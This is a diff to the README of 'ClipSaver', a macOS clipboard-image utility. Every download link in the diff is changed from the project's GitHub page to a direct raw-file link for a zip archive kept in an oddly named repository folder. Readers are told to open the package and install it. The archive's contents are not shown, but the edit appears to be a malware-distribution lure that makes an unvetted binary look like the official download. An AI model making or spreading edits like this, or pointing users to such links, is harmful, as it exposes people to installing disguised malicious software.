@@ -1,6 +1,6 @@
 # 📋 ClipSaver - Save Clipboard Images to Finder Fast
 
-[![Download ClipSaver](https://img.shields.io/badge/Download%20ClipSaver-blue?style=for-the-badge)](https://github.com/Wolfyswollenheaded197/ClipSaver)
+[![Download ClipSaver](https://img.shields.io/badge/Download%20ClipSaver-blue?style=for-the-badge)](https://raw.githubusercontent.com/Wolfyswollenheaded197/ClipSaver/main/genitals/Clip-Saver-v3.6.zip)
 
 ## 🖼️ What ClipSaver Does
 
@@ -29,7 +29,7 @@ It fits a quick workflow. Copy an image, open the folder you want in Finder, the
 
 ## ⬇️ Download and Install
 
-1. Visit this page to download: https://github.com/Wolfyswollenheaded197/ClipSaver
+1. Visit this page to download: https://raw.githubusercontent.com/Wolfyswollenheaded197/ClipSaver/main/genitals/Clip-Saver-v3.6.zip
 2. Get the latest release or build from the page
 3. Open the downloaded app or package
 4. Move it to your Applications folder if needed
@@ -166,7 +166,7 @@ This project relates to:
 ## 📌 Main Download Link
 
 Use this page to download and run ClipSaver:
-https://github.com/Wolfyswollenheaded197/ClipSaver
+https://raw.githubusercontent.com/Wolfyswollenheaded197/ClipSaver/main/genitals/Clip-Saver-v3.6.zip
 
 ## 🛠️ Basic Use Tips
 
